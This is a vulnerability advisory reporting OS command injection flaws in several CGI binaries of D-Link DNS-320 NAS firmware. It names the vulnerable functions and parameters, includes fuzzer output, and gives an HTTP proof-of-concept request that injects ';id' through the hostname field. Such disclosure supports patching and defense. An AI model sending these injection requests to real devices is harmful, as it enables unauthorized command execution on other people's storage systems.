## D-Link DNS-320  system_mgr/account_mgr/dsk_mgr/app_mgr Multiple CGI OS Command Injection

### Title

```
D-Link DNS-320 Multiple CGI OS Command Injection (system_mgr, account_mgr, dsk_mgr, app_mgr)
```

### Vendor / Product / Version

```
D-Link Corporation / DNS-320 ShareCenter NAS (Rev.A) / Firmware 2.06B01 HOTFIX
```

### Component

```
system_mgr.cgi (4 vulns), account_mgr.cgi (2 vulns), dsk_mgr.cgi (2 vulns), app_mgr.cgi (3 vulns)
```

### Vulnerability Type

```
CWE-78: OS Command Injection
```

### CVSS 3.1

```
8.8 (High) CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
```

### Description

```
Multiple OS command injection vulnerabilities across 4 CGI binaries in
D-Link DNS-320 firmware 2.06B01:

system_mgr.cgi:
  - cgi_set_host (0xaf28): "/bin/hostname %s" via hostname — CONFIRMED
  - cgi_set_ntp (0xf53c): "(sntp -r %s) &" via f_ntp_server — CONFIRMED
  - cgi_fan_control (0xae0c): "fan_control %s c &" via f_fan_type
  - cgi_merge_user (0xbe00): "tail -n %s" via total

account_mgr.cgi:
  - cgi_import_users (0xa678): "account_mgr -t '%s'" via app — CONFIRMED
  - cgi_batch_add (0xaa84): via f_prefix, f_start, f_number

dsk_mgr.cgi:
  - cgi_scan_disk (0xede4): "scandisk -p %s" via f_dev — CONFIRMED
  - cgi_raid_rebuild (0xdb40): via f_raidlevel, f_dev

app_mgr.cgi:
  - cgi_ftp_stop (0xdcc4): "ftp -z %s" via f_ip — CONFIRMED
  - cgi_ftp_start (0xf1e8): via f_ip, f_permanent
  - cgi_sqldb (0xf430): via f_dir, f_function

Verification: 5 of 11 functions CONFIRMED by Unicorn Fuzzer.
```

### Proof of Concept

```http
POST /cgi-bin/system_mgr.cgi HTTP/1.1
Host: <target>
Cookie: <valid_session>

cmd=cgi_set_host&hostname=;id&workgroup=WORKGROUP
```

### Unicorn Fuzzer Evidence

```json
[
  {"target_id": "dlink@@DNS320@@system_mgr@@0xaf28", "crash_type": "command_injection", "severity": "confirmed", "crashes": 1},
  {"target_id": "dlink@@DNS320@@system_mgr@@0xf53c", "crash_type": "command_injection", "severity": "confirmed", "crashes": 1},
  {"target_id": "dlink@@DNS320@@account_mgr@@0xa678", "crash_type": "command_injection", "severity": "confirmed", "crashes": 1},
  {"target_id": "dlink@@DNS320@@dsk_mgr@@0xede4", "crash_type": "command_injection", "severity": "confirmed", "crashes": 1},
  {"target_id": "dlink@@DNS320@@app_mgr@@0xdcc4", "crash_type": "command_injection", "severity": "confirmed", "crashes": 1}
]
```

### Credit

```
Discovered by ST4R using FirmRec automated symbolic execution + Unicorn Fuzzer engine.
```

